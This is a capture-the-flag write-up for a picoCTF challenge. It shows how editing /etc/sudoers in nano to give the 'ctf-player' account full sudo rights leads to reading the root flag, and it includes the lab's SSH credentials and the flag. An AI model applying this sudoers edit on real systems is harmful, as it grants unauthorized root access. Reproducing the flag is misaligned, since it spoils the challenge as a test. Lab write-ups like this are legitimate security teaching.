# Absolute Nano
| **Platform** | picoCTF 2026 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Author** | Darkraicg492 |
| **Topic** | Linux / Nano / Sudo |

## Challenge

The challenge says:

```text
You have complete power with nano.

Think you can get the flag?
```

The challenge provides SSH access:

```text
Server: crystal-peak.picoctf.net
Port: 64688
Username: ctf-player
Password: 6d80dbce
```

The hint is:

```text
What can you do with nano?
```

The important idea is that `nano` is not just a normal text editor in this challenge. We have enough access to use it on a privileged file.

The target file is:

```text
/etc/sudoers
```

By modifying the sudo configuration, we can give our user elevated privileges and then read the root flag.

## Step 1 – Connect to the Server

Use the SSH command provided by the challenge:

```bash
ssh -p 64688 ctf-player@crystal-peak.picoctf.net
```

Enter the password:

```text
6d80dbce
```

## Step 2 – Understand the Hint

The hint says:

```text
What can you do with nano?
```

Normally, `nano` is a text editor.

However, if we have the ability to edit a privileged configuration file such as:

```text
/etc/sudoers
```

we can change the sudo permissions of users.

The screenshot shows `/etc/sudoers` being opened directly in `nano`.

## Step 3 – Open `/etc/sudoers`

Run:

```bash
nano /etc/sudoers
```

The sudoers file contains the user privilege configuration.

An important section looks like:

```text
# User privilege specification
root    ALL=(ALL:ALL) ALL
```

We can add our user:

```text
ctf-player ALL=(ALL:ALL) ALL
```

So the section becomes:

```text
# User privilege specification
root        ALL=(ALL:ALL) ALL
ctf-player  ALL=(ALL:ALL) ALL
```

This gives `ctf-player` permission to use `sudo`.

## Step 4 – Save the Changes

Inside `nano`, press:

```text
Ctrl + O
```

Press:

```text
Enter
```

Then exit nano:

```text
Ctrl + X
```

## Step 5 – Check Sudo Permissions

Run:

```bash
sudo -l
```

If the modification was successful, the output should show that `ctf-player` can execute commands with elevated privileges.

For example:

```text
User ctf-player may run the following commands:
    (ALL : ALL) ALL
```

## Step 6 – Read the Root Flag

Now use sudo to read the root flag:

```bash
sudo cat /root/flag.txt
```

Because the command is executed with root privileges, we can read the protected flag file.

## Why This Works

The main weakness is the ability to modify:

```text
/etc/sudoers
```

The `/etc/sudoers` file controls which users can execute commands using `sudo`.

By adding:

```text
ctf-player ALL=(ALL:ALL) ALL
```

we give our account full sudo privileges.

After that:

```bash
sudo cat /root/flag.txt
```

allows us to read the root-owned flag.

## Important Concept – `/etc/sudoers`

The sudoers file controls privileged command execution.

For example:

```text
root ALL=(ALL:ALL) ALL
```

means root has full sudo privileges.

Adding:

```text
ctf-player ALL=(ALL:ALL) ALL
```

gives `ctf-player` the ability to run commands as root through sudo.

This is why write access to `/etc/sudoers` is extremely dangerous.

## Commands Used

Connect to the server:

```bash
ssh -p 64688 ctf-player@crystal-peak.picoctf.net
```

Open the sudoers file:

```bash
nano /etc/sudoers
```

Check sudo privileges:

```bash
sudo -l
```

Read the root flag:

```bash
sudo cat /root/flag.txt
```

## Key Learning

- `nano` can edit text files.
- Privileged configuration files must be properly protected.
- `/etc/sudoers` controls sudo privileges.
- Write access to `/etc/sudoers` can lead to complete root access.
- `sudo -l` is useful for checking the commands a user can execute with sudo.
- Linux privilege escalation often involves finding incorrectly configured permissions.

## Final Solution

```text
SSH into the server
        ↓
Use the nano privilege
        ↓
Open /etc/sudoers
        ↓
Add ctf-player to sudo privileges
        ↓
Save the sudoers file
        ↓
Run sudo -l
        ↓
Confirm elevated privileges
        ↓
Run sudo cat /root/flag.txt
        ↓
Get the flag
```

## Flag

```text
picoCTF{n4n0_411_7h3_w4y_6a5c67f2}
```
